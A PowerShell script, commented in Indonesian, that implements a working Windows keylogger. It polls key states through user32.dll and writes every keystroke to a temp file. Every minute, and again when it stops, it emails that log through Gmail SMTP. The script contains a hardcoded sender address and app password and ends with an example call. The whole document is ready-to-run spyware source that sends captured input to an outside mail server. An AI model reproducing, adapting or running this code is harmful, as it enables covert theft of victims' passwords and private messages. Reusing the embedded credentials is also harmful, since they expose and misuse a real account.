#requires -Version 2
function Start-KeyLogger {
    param (
        [string]$Path = "$env:temp\keylogger.txt",
        [string]$Email = "ssriyanto867@gmail.com",
        [string]$SMTPServer = "smtp.gmail.com",
        [int]$SMTPPort = 587,
        [string]$SMTPUser = "ssriyanto867@gmail.com",
        [string]$SMTPPass = "ptdp lrag zorw qkcm",
        [int]$IntervalMinutes = 1  # Kirim email setiap X menit
    )

    # Load Win32 API
    $signatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);    
'@
    
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    # Buat file log
    $null = New-Item -Path $Path -ItemType File -Force

    # Fungsi untuk mengirim email
    function Send-KeylogToEmail {
        param (
            [string]$AttachmentPath
        )
        # Load MailKit
        Add-Type -Path "C:\Users\ssriy\Downloads\Libs\MailKit.4.13.0\lib\netstandard2.1\MailKit.dll"
        Add-Type -Path "C:\Users\ssriy\Downloads\Libs\MimeKit.4.13.0\lib\netstandard2.1\MimeKit.dll"

        $EmailSubject = "Keylog Report - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        $EmailBody    = "Log file attached."

        # Konfigurasi Email
        $message = New-Object MimeKit.MimeMessage
        $message.From.Add("ssriyanto867@gmail.com")
        $message.To.Add("ssriyanto867@gmail.com")
        $message.Subject = $EmailSubject

        # Buat Body + Attachment
        $bodyBuilder = New-Object MimeKit.BodyBuilder
        $bodyBuilder.TextBody = $EmailBody
        $bodyBuilder.Attachments.Add($AttachmentPath)
        $message.Body = $bodyBuilder.ToMessageBody()

        # Konfigurasi SMTP Client
        $smtpClient = New-Object MailKit.Net.Smtp.SmtpClient
        try {
            $smtpClient.Connect("smtp.gmail.com", 587, [MailKit.Security.SecureSocketOptions]::StartTls)
            $smtpClient.Authenticate("ssriyanto867@gmail.com", "ptdp lrag zorw qkcm")
            $smtpClient.Send($message)
            Write-Host "[+] Email sent successfully!" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] Failed to send email: $_" -ForegroundColor Red
        }
        finally {
            $smtpClient.Disconnect($true)
        }
    }

    # Timer untuk mengirim email berkala
    $Timer = [System.Diagnostics.Stopwatch]::StartNew()
    
    try {
        Write-Host "Keylogger started. Press CTRL+C to stop." -ForegroundColor Red
        while ($true) {
            # Catat keystroke
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                $state = $API::GetAsyncKeyState($ascii)
                if ($state -eq -32767) {
                    $virtualKey = $API::MapVirtualKey($ascii, 3)
                    $kbstate = New-Object Byte[] 256
                    $API::GetKeyboardState($kbstate)
                    $mychar = New-Object System.Text.StringBuilder
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
                    if ($success) {
                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                    }
                }
            }

            # Kirim email setiap IntervalMinutes
            if ($Timer.Elapsed.TotalMinutes -ge $IntervalMinutes) {
                Send-KeylogToEmail -AttachmentPath $Path
                $Timer.Restart()
            }
            Start-Sleep -Milliseconds 40
        }
    }
    finally {
        # Kirim email terakhir saat script dihentikan
        Send-KeylogToEmail -AttachmentPath $Path
        Write-Host "Final log sent to email." -ForegroundColor Yellow
    }
}

# Contoh pemanggilan:
Start-KeyLogger -Email "ssriyanto867@gmail.com" -SMTPServer "smtp.gmail.com" -SMTPUser "ssriyanto867@gmail.com" -SMTPPass "ptdp lrag zorw qkcm" -IntervalMinutes 1